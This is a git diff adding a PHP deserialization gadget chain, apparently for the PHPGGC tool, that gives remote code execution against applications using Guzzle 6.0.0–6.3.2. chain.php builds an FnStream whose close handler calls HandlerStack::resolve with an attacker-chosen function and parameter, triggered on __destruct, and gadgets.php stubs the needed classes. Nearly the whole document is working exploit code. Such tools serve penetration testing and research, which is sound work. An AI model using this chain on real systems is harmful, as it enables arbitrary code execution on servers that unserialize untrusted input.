diff --git a/gadgetchains/Guzzle/RCE/2/chain.php b/gadgetchains/Guzzle/RCE/2/chain.php
new file mode 100644
index 0000000..5bdefea
--- /dev/null
+++ b/gadgetchains/Guzzle/RCE/2/chain.php
@@ -0,0 +1,29 @@
+<?php
+
+namespace GadgetChain\Guzzle;
+
+class RCE2 extends \PHPGGC\GadgetChain\RCE
+{
+    public static $version = '6.0.0 <= 6.3.2';
+    public static $vector = '__destruct';
+    public static $author = 'proclnas';
+    public static $informations = '
+        This chain requires GuzzleHttp\Psr7 < 1.5.0, because FnStream cannot be
+        deserialized afterwards.
+        See https://github.com/ambionics/phpggc/issues/34
+    ';
+
+
+    public function generate(array $parameters)
+    {
+        $function = $parameters['function'];
+        $parameter = $parameters['parameter'];
+
+        return new \GuzzleHttp\Psr7\FnStream([
+            'close' => [
+                new \GuzzleHttp\HandlerStack($function, $parameter),
+                'resolve'
+            ]
+        ]);
+    }
+}
diff --git a/gadgetchains/Guzzle/RCE/2/gadgets.php b/gadgetchains/Guzzle/RCE/2/gadgets.php
new file mode 100644
index 0000000..81f904a
--- /dev/null
+++ b/gadgetchains/Guzzle/RCE/2/gadgets.php
@@ -0,0 +1,71 @@
+<?php
+
+namespace Psr\Http\Message
+{
+	interface StreamInterface{}
+}
+
+namespace GuzzleHttp\Psr7
+{
+	class FnStream implements \Psr\Http\Message\StreamInterface
+	{
+	    private $methods;
+
+	    public function __construct(array $methods)
+	    {
+	        $this->methods = $methods;
+
+	        foreach ($methods as $name => $fn) {
+	            $this->{'_fn_' . $name} = $fn;
+	        }
+	    }
+
+	    /*
+	    public function __destruct()
+	    {
+	        if (isset($this->_fn_close)) {
+	            call_user_func($this->_fn_close);
+	        }
+	    }
+
+	    public function close()
+	    {
+	        return call_user_func($this->_fn_close);
+	    }
+	    */
+	}
+}
+
+namespace GuzzleHttp
+{
+	class HandlerStack
+	{
+	    private $handler;
+	    private $stack = [['exec']];
+	    private $cached = false;
+
+	    function __construct($function)
+	    {
+	      $this->stack = [[$function]];
+	    }
+
+	    /*
+	    public function resolve()
+	    {
+	        if (!$this->cached) {
+	            if (!($prev = $this->handler)) {
+	                throw new \LogicException('No handler has been specified');
+	            }
+
+	            foreach (array_reverse($this->stack) as $fn) {
+	                $prev = $fn[0]($prev);
+	            }
+
+	            $this->cached = $prev;
+	        }
+
+	        return $this->cached;
+	    }
+	    */
+	}
+}
\ No newline at end of file
